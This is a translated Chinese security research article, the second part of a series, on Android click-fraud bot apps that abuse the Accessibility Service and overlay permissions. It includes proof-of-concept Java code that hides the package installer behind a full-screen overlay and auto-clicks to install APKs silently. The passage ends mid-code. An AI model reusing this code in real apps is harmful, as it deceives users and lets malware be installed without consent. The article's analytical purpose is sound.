# 【技术分享】点击型僵尸app：能够自动点击的安卓僵尸app（下）
|
##### 译文声明
本文是翻译文章，文章来源：安全客
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
**译者** **：**[
**兴趣使然的小胃**](http://bobao.360.cn/member/contribute?uid=2819002922)
**预估稿费：200RMB**
**投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿**
**传送门**
****
[******【技术分享】点击型僵尸app：能够自动点击的安卓僵尸app（上）**](http://bobao.360.cn/learning/detail/4686.html)
**四、利用无障碍辅助服务的CBA**
****
[
无障碍服务](https://developer.android.com/reference/android/accessibilityservice/AccessibilityService.html)是Android平台提供的一种服务，该服务提供了一种用户界面增强功能，可以帮助残障用户或者暂时无法与设备完全交互的用户。
无障碍服务的服务对象本来只局限于使用Android设备及应用的残障人士。应用程序可以通过这种服务来发现在屏幕上显示的UI小部件，查询这些部件的内容，以程序方式与这些部件交互。利用这些功能，残障用户可以更好地访问Android设备。
恶意软件一直以来都在滥用无障碍服务（Accessibility Service
Abuse，ASA）来发起攻击，如[DoubleLocker](https://blog.zimperium.com/detecting-doublelocker-ransomware/)勒索软件以及Shedun恶意软件（也叫做Kemoge、Shiftybug以及Shuanet）等大规模攻击事件中就用到过这一技术。
应用可以使用无障碍服务以及（或者）顶层绘制（[Draw on
Top](https://developer.android.com/reference/android/Manifest.permission.html#SYSTEM_ALERT_WINDOW)）权限，创建一个位于所有其他应用顶层的窗口，这种攻击手法也称之为[“Cloak
& Dagger”攻击](http://cloak-and-dagger.org/)。利用这种攻击手法，恶意应用可以完全控制UI反馈闭环，悄无声息接管整个设备。
其他类型的CBA无需请求任何权限，而 **Cloak &
Dagger（以下简称C&D）**攻击需要请求SYSTEM_ALERT_WINDOW（顶层绘制）以及BIND_ACCESSIBILITY_SERVICE（无障碍服务）权限。如果应用的安装渠道源自于Play
Store，那么该应用会自动获得SYSTEM ALERT WINDOW权限。
这两个权限结合起来可以实现某些恶意软件所具备的功能：
**1、静默安装应用。由于安装过程无需用户同意，应用程序可以变成上帝应用（启用了所有权限），或者换句话说，该应用可以安装间谍软件。**
**2、发起非常完美的隐蔽钓鱼攻击。**
**3、将PIN码改成攻击者控制的PIN码，阻止用户访问设备（然后要求用户支付赎金）。**
**4、记录用户键盘操作，可以窃取密码（只需获得无障碍服务权限）。**
我们来演示一下某款Android CBA如何滥用无障碍服务，不经用户许可安装其他Android应用。
前文提到的广告欺诈点击行为在设备上的表现非常明显，然而在设备端我们无法发现基于安装欺诈或者流量欺诈的欺诈行为，但可以使用基于服务端信息的其他识别方法进行检测。
本文所研究的是CBA网络的营收问题，因此，为实现利益最大化，应用程序可能会安装多个广告软件或者CBA程序。无论如何，能够发起C&D攻击的CBA比单纯的广告欺诈点击软件更为可恶，原因如下：
1、Android应用可以使用[ **VirtualApp**](https://github.com/asLody/VirtualApp)框架或基于[
**DexClassLoader**](https://developer.android.com/reference/dalvik/system/DexClassLoader.html)的其他技术来动态加载不受监管的代码。这些代码可能是勒索软件或者能够窃取密码的间谍软件。
2、所安装的应用无需经过用户许可，没有经过Google Play
Store的校验，因此可以是勒索软件或者窃取密码的间谍软件，也可以动态加载未受监管的类似代码安装其他恶意软件。
我之前也发现过使用自动点击技术完成应用安装的案例，但这里我想以自己写的概念验证代码（PoC）为例子来介绍。自己的代码更加干净整洁，通过逆向工程方法提取的其他代码还存在部分混淆情况，不便于分析。
接下来介绍的这个示例应用可以通过如下方法来安装其他应用程序：
1、在manifest中注册AccessibilityService，配置intent过滤器，设置的name属性值为
**accessibilityservice.AccessibilityService** 。
2、如果尚未获得无障碍服务权限，则以“合理的”理由请求该权限。
3、为了隐藏安装窗口，使用一个布局（layout）填充整个屏幕，该布局使用 **LayoutParams.TYPE_SYSTEM_ALERT** 标志。
4、开始安装本地apk文件。
5、过滤 **AccessibilityService** ，在android.packageinstaller软件包中，查找
**PackageInstallerActivity** 中的 **AccessibilityEvent** 。
6、通过 **findAccessibilityNodeInfosByText** 方法，查找待点击的安装按钮。
7、使用 **performAction(AccessibilityNodeInfo.ACTION_CLICK)** 语句自动点击按钮。
8、撤掉上层覆盖窗口（如果使用过顶层窗口的话）。
在Manifest文件中注册 **AccessibilityService** ，如下所示：
如果尚未获得无障碍服务权限，则以“合理的”理由请求该权限。
    private static final String SERVICE_NAME    = "money.for.nothing/.AccessibilityServiceImpl";
    private boolean isAccessibilityServiceEnabled() {
       List accessibilityServices =
               mAccessibilityManager.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_GENERIC);
       for (AccessibilityServiceInfo info : accessibilityServices) {
           if (info.getId().equals(SERVICE_NAME)) {
               return true;
           }
       }
       Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
       startActivity(intent);
       return false;
    }
使用“合适”的上下文环境来隐藏安装窗口。
    final WindowManager.LayoutParams params = new WindowManager.LayoutParams(
           WindowManager.LayoutParams.MATCH_PARENT,
           WindowManager.LayoutParams.MATCH_PARENT,
           WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
           WindowManager.LayoutParams.FLAG_FULLSCREEN,
           PixelFormat.TRANSLUCENT);
    LayoutInflater li = (LayoutInflater) getSystemService(LAYOUT_INFLATER_SERVICE);
    View mainView = null;switch (process) {   case PAYMENT:
           mainView = li.inflate(R.layout.money_for_nothing_installing, null);       break;   case LOCATION:
           mainView = li.inflate(R.layout.money_for_nothing_setting, null);       break;   case UNINSTALL:
           mainView = li.inflate(R.layout.money_for_nothing_searching, null);
           Break; case INSTALL:
           mainView = li.inflate(R.layout.money_for_nothing_loading, null);
           Break;
    }final View finalMainView = mainView;
    _windowManager.addView(mainView, params);
开始安装本地apk文件。
    String path = "/storage/emulated/legacy/Download/zanti3.01.apk";
    if (isAccessibilityServiceEnabled()) {
         Intent promptInstall = new Intent(Intent.ACTION_VIEW)
               .setDataAndType(Uri.parse("file://"+ path),